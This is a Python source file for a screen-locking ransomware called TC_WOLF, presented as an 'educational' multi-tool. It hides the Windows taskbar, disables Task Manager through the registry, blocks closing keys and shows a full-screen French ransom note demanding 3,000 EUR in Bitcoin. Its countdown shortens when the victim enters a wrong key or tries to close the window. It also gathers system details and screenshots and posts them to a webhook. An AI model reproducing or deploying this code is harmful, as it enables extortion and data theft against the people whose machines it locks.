# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================



import sys
import base64
import os
import tempfile
import threading
import traceback
import json
import socket
import platform
import subprocess
import winreg
import ctypes
import time
from pathlib import Path
from datetime import datetime

# ==== MODULES ====
import requests
import pyautogui
import webbrowser

# ==== WINDOWS MODULES ====
try:
    import win32api
    import win32con
    import win32gui
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

from PyQt5.QtCore import Qt, QTimer, QDateTime, QEvent, QUrl
from PyQt5.QtGui import QPixmap
from PyQt5.QtWidgets import (
    QApplication, QLabel, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QListWidget, QListWidgetItem, QTextEdit, QLineEdit, QPushButton, 
    QDialog, QFrame, QMessageBox
)
from PyQt5.QtWebEngineWidgets import QWebEngineView

# ==== IMAGES ====
JESTER_IMG_BASE64 = b""
INTRO_IMG_BASE64  = b""

# ==== CONFIG ====
UNLOCK_PASSWORD = "123"
WEBHOOK_URL = ""
CAPTURE_SCREENSHOT = False
COLLECT_DATA = True
YOUTUBE_URL = "https://www.youtube.com/watch?v=GXlJ3VaNMLY&t=1358s"

# ============================================================
# YOUTUBE VIDEO FUNCTIONS
# ============================================================
def open_youtube_video():
    """Opens YouTube video in browser without audio controls"""
    
    def open_in_default_browser():
        """Opens YouTube in default browser"""
        try:
            # Open in default browser
            webbrowser.open(YOUTUBE_URL)
            time.sleep(2)
            
            # Try to send F11 for fullscreen
            try:
                time.sleep(3)
                import pyautogui
                pyautogui.press('f')
                time.sleep(0.5)
                pyautogui.press('f11')
            except:
                pass
            return True
        except:
            return False
    
    def open_with_powershell():
        """Alternative method using PowerShell"""
        ps_script = f"""
        $url = "{YOUTUBE_URL}"
        Start-Process $url
        Start-Sleep -Seconds 3
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait("{{F}}")
        Start-Sleep -Milliseconds 500
        [System.Windows.Forms.SendKeys]::SendWait("{{F11}}")
        """
        
        try:
            subprocess.Popen(['powershell', '-Command', ps_script],
                           creationflags=subprocess.CREATE_NO_WINDOW)
            return True
        except:
            return False
    
    # Try multiple methods
    methods = [open_in_default_browser, open_with_powershell]
    
    for method in methods:
        try:
            if method():
                _write_debug_log(f"[YOUTUBE] Video opened with {method.__name__}")
                break
        except Exception as e:
            _write_debug_log(f"[YOUTUBE] Error with {method.__name__}: {str(e)}")
    
    # Open multiple instances for multiple screens
    for i in range(1, 4):  # Try up to 3 instances
        threading.Timer(i * 3, open_in_default_browser).start()

def close_youtube_video():
    """Closes YouTube browser windows"""
    try:
        # Kill browser processes
        processes = ['chrome.exe', 'msedge.exe', 'firefox.exe', 'opera.exe', 'brave.exe']
        for proc in processes:
            subprocess.run(f'taskkill /F /IM {proc} /T', 
                         shell=True, 
                         capture_output=True,
                         creationflags=subprocess.CREATE_NO_WINDOW)
        _write_debug_log("[YOUTUBE] Browser windows closed")
    except Exception as e:
        _write_debug_log(f"[YOUTUBE] Error closing: {str(e)}")

# ============================================================
# FONCTIONS UTILITAIRES
# ============================================================
def pixmap_from_base64(data: bytes) -> QPixmap:
    px = QPixmap()
    if data:
        px.loadFromData(base64.b64decode(data))
    return px

def generate_real_files(max_files: int = None):
    files = []
    count = 0
    for root, _, filenames in os.walk(os.path.expanduser("~")):
        for f in filenames:
            files.append(os.path.join(root, f))
            count += 1
            if max_files is not None and count >= max_files:
                return files
    return files

def _write_debug_log(message: str):
    try:
        desktop_path = Path.home() / "Desktop"
        log_file = desktop_path / "tcwolf.log"
        timestamp = QDateTime.currentDateTime().toString("dd-MM-yy HH:mm:ss")
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {message}\n")
    except Exception:
        pass

# ============================================================
# VERROUILLAGE SYSTÈME
# ============================================================
def enable_system_lockdown():
    try:
        _write_debug_log("[LOCKDOWN] Activation verrouillage")
        
        if not WIN32_AVAILABLE:
            return
        
        # Masquer barre des tâches
        try:
            taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
            win32gui.ShowWindow(taskbar, win32con.SW_HIDE)
            
            secondary = win32gui.FindWindow("Shell_SecondaryTrayWnd", None)
            if secondary:
                win32gui.ShowWindow(secondary, win32con.SW_HIDE)
        except:
            pass
        
        # Désactiver Alt+Tab temporairement
        try:
            ctypes.windll.user32.BlockInput(True)
            threading.Timer(1.5, lambda: ctypes.windll.user32.BlockInput(False)).start()
        except:
            pass
        
        # Désactiver Task Manager
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
        
    except Exception as e:
        _write_debug_log(f"[LOCKDOWN] Erreur: {str(e)}")

def disable_system_lockdown():
    try:
        if not WIN32_AVAILABLE:
            return
            
        # Réafficher barre des tâches
        try:
            taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
            win32gui.ShowWindow(taskbar, win32con.SW_SHOW)
            
            secondary = win32gui.FindWindow("Shell_SecondaryTrayWnd", None)
            if secondary:
                win32gui.ShowWindow(secondary, win32con.SW_SHOW)
        except:
            pass
        
        # Réactiver Task Manager
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass
        
    except Exception as e:
        _write_debug_log(f"[LOCKDOWN] Erreur désactivation: {str(e)}")

# ============================================================
# COLLECTE DONNÉES
# ============================================================
def collect_system_data():
    data = {"timestamp": datetime.now().isoformat(), "status": "INFECTED"}
    
    try:
        data["system"] = {
            "computer_name": os.getenv('COMPUTERNAME', 'UNKNOWN'),
            "username": os.getenv('USERNAME', 'UNKNOWN'),
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
        }
        
        # IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            data["network"] = {"local_ip": local_ip}
        except:
            data["network"] = {"error": "No IP"}
        
        # Logiciels
        installed_software = []
        try:
            reg_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for reg_path in reg_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                    for i in range(0, min(50, winreg.QueryInfoKey(key)[0])):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                            if name:
                                installed_software.append(name[:50])
                            winreg.CloseKey(subkey)
                        except:
                            continue
                    winreg.CloseKey(key)
                except:
                    continue
        except:
            installed_software = ["REG_ERROR"]
        
        data["software"] = {"count": len(installed_software), "sample": installed_software[:10]}
        
        _write_debug_log(f"[DATA] {len(installed_software)} logiciels collectés")
        
    except Exception as e:
        data["error"] = str(e)
    
    return data

# ============================================================
# CAPTURE D'ÉCRAN
# ============================================================
def capture_and_send_comprehensive():
    if not CAPTURE_SCREENSHOT or not WEBHOOK_URL:
        return
    
    try:
        _write_debug_log("[CAPTURE] Capture en cours")
        
        system_data = {}
        if COLLECT_DATA:
            system_data = collect_system_data()
        
        screenshot = pyautogui.screenshot()
        temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
        screenshot_path = temp_file.name
        screenshot.save(screenshot_path)
        temp_file.close()
        
        with open(screenshot_path, 'rb') as f:
            screenshot_data = f.read()
        
        computer_name = system_data.get("system", {}).get("computer_name", "UNKNOWN")
        
        payload = {
            "content": f"🚨 **TC_WOLF - INFECTION**\n💻 `{computer_name}`\n⏰ `{datetime.now().strftime('%d/%m %H:%M')}`",
            "username": "TC_WOLF Alert"
        }
        
        files = {
            'file': (f'tcwolf_{computer_name}.png', screenshot_data, 'image/png'),
            'data.json': ('system_data.json', json.dumps(system_data, indent=2), 'application/json')
        }
        
        def send_data():
            try:
                requests.post(WEBHOOK_URL, data=payload, files=files, timeout=20)
            except:
                pass
            finally:
                try:
                    os.unlink(screenshot_path)
                except:
                    pass
        
        threading.Thread(target=send_data, daemon=True).start()
        _write_debug_log("[CAPTURE] Capture envoyée")
        
    except Exception as e:
        _write_debug_log(f"[CAPTURE] Erreur: {str(e)}")

def capture_post_interaction(reason: str = "INTERACTION"):
    if not CAPTURE_SCREENSHOT or not WEBHOOK_URL:
        return
    
    try:
        time.sleep(0.5)
        screenshot = pyautogui.screenshot()
        temp_file = tempfile.NamedTemporaryFile(suffix='_post.png', delete=False)
        screenshot_path = temp_file.name
        screenshot.save(screenshot_path)
        temp_file.close()
        
        with open(screenshot_path, 'rb') as f:
            file_data = f.read()
        
        computer_name = os.getenv('COMPUTERNAME', 'UNKNOWN')
        payload = {"content": f"🔄 **Interaction** `{computer_name}` - `{reason}`"}
        files = {'file': (f'interaction_{computer_name}.png', file_data, 'image/png')}
        
        def send():
            try:
                requests.post(WEBHOOK_URL, data=payload, files=files, timeout=10)
            except:
                pass
            finally:
                try:
                    os.unlink(screenshot_path)
                except:
                    pass
        
        threading.Thread(target=send, daemon=True).start()
        
    except Exception as e:
        pass

# ============================================================
# INTERFACES GRAPHIQUES
# ============================================================
class IntroDialog(QDialog):
    def __init__(self):
        super().__init__()
        self.choice = None
        self.setWindowTitle("Question")
        self.setFixedSize(400, 350)
        self.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.CustomizeWindowHint)
        self.setStyleSheet("background-color:black;color:red;font-family:Courier;font-size:16px;")
        layout = QVBoxLayout(self)

        img = QLabel()
        img.setPixmap(pixmap_from_base64(JESTER_IMG_BASE64).scaledToWidth(300, Qt.SmoothTransformation))
        img.setAlignment(Qt.AlignCenter)
        layout.addWidget(img)

        q = QLabel("Are you a 1 or a 0?")
        q.setAlignment(Qt.AlignCenter)
        layout.addWidget(q)

        self.input_field = QLineEdit()
        self.input_field.setPlaceholderText("Enter 0 or 1...")
        self.input_field.setAlignment(Qt.AlignCenter)
        self.input_field.setStyleSheet("background-color:black;color:red;border:1px solid red;")
        layout.addWidget(self.input_field)

        btn = QPushButton("Accept")
        btn.setStyleSheet("background-color:black;color:red;border:1px solid red;padding:4px;")
        btn.clicked.connect(self.accept_input)
        layout.addWidget(btn)

    def accept_input(self):
        v = self.input_field.text().strip()
        if v in ("0", "1"):
            self.choice = v
            self.accept()
        else:
            QMessageBox.warning(self, "Erreur", "Enter 0 or 1 only.", QMessageBox.Ok)

    def reject(self):
        pass

    def closeEvent(self, e):
        e.ignore()

class YouTubePlayerWindow(QMainWindow):
    """Window that plays YouTube video in background"""
    def __init__(self, screen_num=0):
        super().__init__()
        self.screen_num = screen_num
        
        # Transparent window for YouTube
        self.setWindowFlags(
            Qt.FramelessWindowHint |
            Qt.WindowStaysOnTopHint |
            Qt.WindowTransparentForInput |
            Qt.X11BypassWindowManagerHint
        )
        
        self.setStyleSheet("background-color: transparent;")
        
        # Create web view for YouTube
        self.web_view = QWebEngineView()
        self.web_view.setUrl(QUrl(YOUTUBE_URL))
        
        # Set to fullscreen
        self.setCentralWidget(self.web_view)
        
        # JavaScript to hide controls and auto-play
        js_code = """
        // Hide YouTube controls
        document.addEventListener('DOMContentLoaded', function() {
            // Wait for video to load
            setTimeout(function() {
                // Try to click on video for focus
                var video = document.querySelector('video');
                if (video) {
                    video.click();
                }
                
                // Hide various controls
                var elementsToHide = [
                    '.ytp-chrome-top',
                    '.ytp-chrome-bottom',
                    '.ytp-panel-menu',
                    '.ytp-show-cards-title'
                ];
                
                elementsToHide.forEach(function(selector) {
                    var el = document.querySelector(selector);
                    if (el) {
                        el.style.display = 'none';
                    }
                });
                
                // Try to enter fullscreen
                if (video && video.requestFullscreen) {
                    video.requestFullscreen();
                }
            }, 3000);
        });
        """
        
        # Execute JavaScript
        self.web_view.page().runJavaScript(js_code)

class JesterWindow(QMainWindow):
    # Synchronisation globale
    _all_windows = []
    _youtube_windows = []
    _master_timer = QDateTime.currentDateTime().addSecs(24 * 60 * 60)
    
    def __init__(self, screen_num=0):
        super().__init__()
        self.screen_num = screen_num
        self.setWindowTitle("TC_WOLF - SYSTEM LOCKED")
        
        # Flags fenêtre
        self.setWindowFlags(
            Qt.FramelessWindowHint |
            Qt.WindowStaysOnTopHint |
            Qt.WindowDoesNotAcceptFocus |
            Qt.X11BypassWindowManagerHint
        )
        
        # Semi-transparent background so YouTube shows through
        self.setStyleSheet("""
            QMainWindow { 
                background-color: rgba(0, 0, 0, 0.85);
            }
            QLabel { 
                color: #ff0000; 
                font-family: 'Courier New'; 
            }
            QTextEdit { 
                background-color: rgba(0, 0, 0, 0.7); 
                color: #ff0000; 
                font-family: 'Courier New'; 
                border: none; 
            }
            QListWidget { 
                background-color: rgba(0, 0, 0, 0.7); 
                color: #ff0000; 
                font-family: 'Courier New'; 
                border: 1px solid #ff0000; 
            }
            QLineEdit { 
                background-color: rgba(0, 0, 0, 0.9); 
                color: #ff0000; 
                border: 2px solid #ff0000; 
                font-family: 'Courier New'; 
                padding: 5px; 
            }
            QPushButton { 
                background-color: rgba(0, 0, 0, 0.9); 
                color: #ff0000; 
                border: 2px solid #ff0000; 
                font-family: 'Courier New'; 
                padding: 8px; 
            }
            QPushButton:hover { 
                background-color: rgba(34, 0, 0, 0.9); 
                border: 2px solid #ff3333; 
            }
            QFrame { 
                border: 1px solid #ff0000; 
                background-color: rgba(0, 0, 0, 0.7);
            }
        """)
        
        # Ajouter à la liste globale
        JesterWindow._all_windows.append(self)
        
        # ===== INTERFACE IDENTIQUE POUR TOUS LES ÉCRANS =====
        main_widget = QWidget()
        main_layout = QHBoxLayout(main_widget)

        # --- GAUCHE ---
        left_layout = QVBoxLayout()
        
        # Logo
        img_label = QLabel()
        img_label.setPixmap(pixmap_from_base64(JESTER_IMG_BASE64).scaledToWidth(200, Qt.SmoothTransformation))
        img_label.setAlignment(Qt.AlignCenter)
        left_layout.addWidget(img_label)
        
        # Titre
        logo_text = QLabel("WE ARE TC WOLF")
        logo_text.setAlignment(Qt.AlignCenter)
        logo_text.setStyleSheet("color: #ff0000; font-size: 22px; font-weight: bold;")
        left_layout.addWidget(logo_text)
        
        # Liste fichiers
        file_list = QListWidget()
        file_list.setMinimumHeight(300)
        for f in generate_real_files(40):
            item = QListWidgetItem(f"🔒 {f}")
            file_list.addItem(item)
        left_layout.addWidget(file_list)
        
        main_layout.addLayout(left_layout, 1)

        # --- DROITE ---
        right_layout = QVBoxLayout()
        
        # Message rançon - MODIFIÉ POUR CENTRER LE TEXTE IMPORTANT
        message_frame = QFrame()
        message_frame.setMaximumHeight(400)
        message_layout = QVBoxLayout(message_frame)
        
        message = QTextEdit()
        message.setReadOnly(True)
        message.setHtml(f"""
<div style='color: #ff0000; font-family: "Courier New"; font-size: 14px; text-align: center;'>
<pre style='margin: 0; text-align: center;'>
╔═══════════════════════════════════════════════════════════════════╗
║                S Y S T È M E   V E R R O U I L L É                ║
╚═══════════════════════════════════════════════════════════════════╝

<b><span style='font-size: 20px;'>⚠️  VOTRE SYSTÈME EST VERROUILLÉ</span></b>

<span style='color: #ff5555;'>🎬 YouTube Video Playing in Background</span>

─────────────────────────────────────────────────────────────────────
                    <b>💰  P A I E M E N T</b>
─────────────────────────────────────────────────────────────────────
<b>Montant : 3 000 €</b>

<b>Bitcoin Wallet :</b>
1TC-W01fH4ck3rsPwnEverything999999999

<b>Email contact :</b>
dark.payment@tutanota.com

─────────────────────────────────────────────────────────────────────
                    <b>⏰  D É L A I : 24 HEURES</b>
─────────────────────────────────────────────────────────────────────
<span id='timer' style='font-size: 18px;'>24:00:00</span>

─────────────────────────────────────────────────────────────────────
<b>⚠️  Avertissement :</b>
• YouTube video playing
• No audio controls
• Toute tentative réduit le temps
─────────────────────────────────────────────────────────────────────
</pre>
</div>
""")
        message_layout.addWidget(message)
        right_layout.addWidget(message_frame)
        
        # Zone clé
        key_frame = QFrame()
        key_layout = QVBoxLayout(key_frame)
        
        banner = QLabel("ENTER ACCESS KEY (After Payment)")
        banner.setAlignment(Qt.AlignCenter)
        banner.setStyleSheet("color: #ff0000; font-size: 16px; font-weight: bold;")
        key_layout.addWidget(banner)
        
        self.access_box = QLineEdit()
        self.access_box.setAlignment(Qt.AlignCenter)
        self.access_box.setPlaceholderText("Enter decryption key here...")
        self.access_box.returnPressed.connect(self.check_password)
        key_layout.addWidget(self.access_box)
        
        confirm_btn = QPushButton("UNLOCK SYSTEM")
        confirm_btn.clicked.connect(self.check_password)
        key_layout.addWidget(confirm_btn)
        
        right_layout.addWidget(key_frame)
        
        # Timer
        self.timer_label = QLabel("24:00:00")
        self.timer_label.setAlignment(Qt.AlignCenter)
        self.timer_label.setStyleSheet("""
            color: #ff0000;
            font-family: 'Courier New', monospace;
            font-size: 32px;
            font-weight: bold;
            border: 3px solid #ff0000;
            padding: 10px;
            background-color: rgba(17, 0, 0, 0.9);
        """)
        right_layout.addWidget(self.timer_label)
        
        # YouTube URL display
        youtube_label = QLabel(f"Video: {YOUTUBE_URL[:50]}...")
        youtube_label.setAlignment(Qt.AlignCenter)
        youtube_label.setStyleSheet("color: #ff5555; font-size: 12px;")
        right_layout.addWidget(youtube_label)
        
        # Timer synchronisé
        self.end_time = JesterWindow._master_timer
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_timer)
        self.timer.start(1000)
        self.update_timer()
        
        main_layout.addLayout(right_layout, 2)
        self.setCentralWidget(main_widget)
        
        _write_debug_log(f"[WINDOW] Nouvelle fenêtre (total: {len(JesterWindow._all_windows)})")

    def check_password(self):
        password = self.access_box.text().strip()
        
        if password == UNLOCK_PASSWORD:
            # CORRECT - TOUT DÉVERROUILLER
            capture_post_interaction("PASSWORD_CORRECT")
            _write_debug_log(f"[AUTH] Mot de passe correct - {len(JesterWindow._all_windows)} fenêtres")
            
            # Close YouTube video
            close_youtube_video()
            
            disable_system_lockdown()
            
            # Message succès
            msg = QMessageBox(self)
            msg.setWindowTitle("✅ SYSTEM UNLOCKED")
            msg.setText("✅ System unlocked.\nYouTube video closed.\nAll windows closing...")
            msg.setIcon(QMessageBox.Information)
            msg.show()
            
            # Fermer toutes les fenêtres
            QTimer.singleShot(1500, self._close_all_windows)
            
        else:
            # INCORRECT - PUNITION
            capture_post_interaction("PASSWORD_INCORRECT")
            _write_debug_log(f"[AUTH] Mot de passe incorrect")
            
            # Réduire temps sur toutes les fenêtres
            reduction = 300  # 5 minutes
            for win in JesterWindow._all_windows:
                try:
                    current_time = QDateTime.currentDateTime()
                    remaining = current_time.secsTo(win.end_time)
                    if remaining > reduction:
                        win.end_time = current_time.addSecs(remaining - reduction)
                        JesterWindow._master_timer = win.end_time
                except:
                    pass
            
            # Message erreur
            QMessageBox.critical(
                self,
                "ACCESS DENIED",
                f"❌ Wrong password.\nTime reduced by 5 minutes."
            )

    def _close_all_windows(self):
        """Ferme toutes les fenêtres."""
        # Close YouTube windows
        for win in JesterWindow._youtube_windows:
            try:
                win.close()
            except:
                pass
        
        # Close lock windows
        for win in JesterWindow._all_windows:
            try:
                win.close()
            except:
                pass
        
        QApplication.quit()

    def update_timer(self):
        now = QDateTime.currentDateTime()
        remaining = now.secsTo(self.end_time)
        
        if remaining <= 0:
            self.timer_label.setText("00:00:00")
            self.timer.stop()
            
            # Temps écoulé
            if self == JesterWindow._all_windows[0]:  # Seulement sur première fenêtre
                QMessageBox.critical(
                    self,
                    "TIME EXPIRED",
                    "⏰ Time expired.\nAll decryption keys DESTROYED."
                )
        else:
            hours = remaining // 3600
            minutes = (remaining % 3600) // 60
            seconds = remaining % 60
            self.timer_label.setText(f"{hours:02d}:{minutes:02d}:{seconds:02d}")
            
            if remaining < 3600:
                self.timer_label.setStyleSheet("""
                    color: #ff3333;
                    font-family: 'Courier New', monospace;
                    font-size: 32px;
                    font-weight: bold;
                    border: 3px solid #ff3333;
                    padding: 10px;
                    background-color: rgba(34, 0, 0, 0.9);
                """)

    def closeEvent(self, event):
        capture_post_interaction("WINDOW_CLOSE_ATTEMPT")
        _write_debug_log("[SECURITY] Tentative fermeture")
        
        # Réduire temps
        reduction = 180  # 3 minutes
        for win in JesterWindow._all_windows:
            try:
                current_time = QDateTime.currentDateTime()
                remaining = current_time.secsTo(win.end_time)
                if remaining > reduction:
                    win.end_time = current_time.addSecs(remaining - reduction)
                    JesterWindow._master_timer = win.end_time
            except:
                pass
        
        # Message erreur
        error_msg = QMessageBox(self)
        error_msg.setWindowTitle("🚫 SECURITY VIOLATION")
        error_msg.setText("Closing attempt detected!\nTime reduced by 3 minutes.")
        error_msg.setIcon(QMessageBox.Critical)
        error_msg.setWindowFlags(error_msg.windowFlags() | Qt.WindowStaysOnTopHint)
        error_msg.exec_()
        
        # Forcer focus
        self.raise_()
        self.activateWindow()
        
        event.ignore()

    def keyPressEvent(self, event):
        # Bloquer touches système
        if (event.key() == Qt.Key_F4 and (event.modifiers() & Qt.AltModifier)) \
           or (event.key() == Qt.Key_W and (event.modifiers() & Qt.ControlModifier)) \
           or (event.key() == Qt.Key_Q and (event.modifiers() & Qt.ControlModifier)) \
           or (event.key() == Qt.Key_Escape):
            capture_post_interaction("KEY_BLOCKED")
            return
        
        super().keyPressEvent(event)

    def changeEvent(self, event):
        if event.type() == QEvent.WindowStateChange:
            if self.windowState() & Qt.WindowMinimized:
                self.showFullScreen()
                self.raise_()
                self.activateWindow()
        
        super().changeEvent(event)

# ============================================================
# POINT D'ENTRÉE - LANCEMENT SUR TOUS LES ÉCRANS
# ============================================================
if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setQuitOnLastWindowClosed(False)
    
    _write_debug_log("=" * 50)
    _write_debug_log("TC_WOLF - LANCEMENT MULTI-ÉCRANS AVEC YOUTUBE")
    _write_debug_log("=" * 50)
    
    # Écran intro
    intro = IntroDialog()
    intro.exec_()

    if intro.choice == "0":
        _write_debug_log("[MAIN] Infection démarrée")
        
        # PHASE 1: OPEN YOUTUBE VIDEO
        _write_debug_log("[MAIN] Opening YouTube video...")
        threading.Thread(target=open_youtube_video, daemon=True).start()
        
        # PHASE 2: CAPTURE INITIALE
        if CAPTURE_SCREENSHOT and WEBHOOK_URL:
            threading.Thread(target=capture_and_send_comprehensive, daemon=True).start()
        
        # PHASE 3: VERROUILLAGE SYSTÈME
        _write_debug_log("[MAIN] Enabling system lockdown...")
        threading.Thread(target=enable_system_lockdown, daemon=True).start()
        
        # PHASE 4: DÉTECTION ÉCRANS
        screens = app.screens()
        _write_debug_log(f"[MAIN] {len(screens)} écran(s) détecté(s)")
        
        # Créer une fenêtre YouTube ET une fenêtre Jester sur CHAQUE écran
        windows = []
        for i, screen in enumerate(screens):
            try:
                # Create YouTube window (transparent, behind)
                yt_win = YouTubePlayerWindow(i)
                screen_geometry = screen.geometry()
                yt_win.move(screen_geometry.x(), screen_geometry.y())
                yt_win.resize(screen_geometry.width(), screen_geometry.height())
                yt_win.showFullScreen()
                JesterWindow._youtube_windows.append(yt_win)
                _write_debug_log(f"[MAIN] YouTube window créée sur écran {i+1}")
                
                # Create Jester window (semi-transparent, on top)
                jester_win = JesterWindow(i)
                jester_win.move(screen_geometry.x(), screen_geometry.y())
                jester_win.resize(screen_geometry.width(), screen_geometry.height())
                jester_win.showFullScreen()
                windows.append(jester_win)
                
                _write_debug_log(f"[MAIN] Jester window créée sur écran {i+1}")
                
                # Petite pause
                time.sleep(0.2)
                
            except Exception as e:
                _write_debug_log(f"[MAIN] Erreur écran {i+1}: {str(e)}")
                traceback.print_exc()
        
        # Fallback si aucun écran
        if not windows:
            # Create YouTube window
            yt_win = YouTubePlayerWindow()
            yt_win.showFullScreen()
            JesterWindow._youtube_windows.append(yt_win)
            
            # Create Jester window
            jester_win = JesterWindow()
            jester_win.showFullScreen()
            windows.append(jester_win)
        
        _write_debug_log(f"[MAIN] {len(windows)} fenêtre(s) Jester active(s)")
        _write_debug_log(f"[MAIN] {len(JesterWindow._youtube_windows)} fenêtre(s) YouTube active(s)")
        
        # Capture confirmation
        if CAPTURE_SCREENSHOT and WEBHOOK_URL:
            threading.Timer(3.0, lambda: capture_post_interaction("MULTI_SCREEN_ACTIVE_WITH_YOUTUBE")).start()
        
        _write_debug_log("[MAIN] System locked with YouTube video playing")
        
        # Exécution
        sys.exit(app.exec_())
        
    else:
        _write_debug_log("[MAIN] Arrêt (choix 1)")
        sys.exit(0)